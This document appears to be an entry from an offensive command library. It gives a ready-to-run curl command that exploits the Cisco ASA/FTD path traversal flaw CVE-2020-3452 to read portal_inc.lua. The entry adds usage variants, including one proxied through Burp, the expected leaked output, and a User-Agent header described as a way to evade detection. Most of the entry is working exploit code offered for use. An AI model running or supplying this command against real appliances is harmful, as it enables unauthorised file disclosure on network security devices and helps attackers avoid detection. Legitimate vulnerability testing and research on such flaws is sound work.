---
data: >-
  curl -i -s -k -X $'GET' -H $'Host: target.example.com' -H $'User-Agent:
  Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H
  $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H
  $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1'
  $'https://target.example.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
tags:
  - http
  - traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:05.600Z'
id: f1fbafb0-0bfe-4382-b43f-ccfb5b95a6df
verified: false
validated: true
submitted: true
---
# curl-translation-table-traversal

## Command

```bash
curl -i -s -k -X $'GET' -H $'Host: target.example.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' $'https://target.example.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
```

## Description

This curl command reproduces the path traversal vulnerability in Cisco ASA/FTD's translation-table endpoint by sending a GET request with '../' in the lang parameter to disclose portal_inc.lua. Use when testing CVE-2020-3452 for file disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include HTTP headers in output | Yes |
| `-s` | Silent mode, no progress meter | Yes |
| `-k` | Allow insecure SSL connections | Yes |
| `-H 'Host: ...'` | Specify target host | Yes |
| `-H 'User-Agent: ...'` | Mimic browser to evade detection | Yes |
| `URL with params` | Endpoint and traversal payload | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X GET -H 'Host: target.example.com' ... https://target.example.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&lang=../
```

### Advanced Usage

Add `--proxy` for chaining with Burp: ```bash
curl ... --proxy 127.0.0.1:8080 ...
```

## Expected Output

HTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\n[Lua source code, e.g., dofile('/+CSCOE+/include/common.lua')]

## Related

- [[commands/curl-oem-customization-traversal]]
- [[procedures/Exploit-Translation-Table-Path-Traversal]]
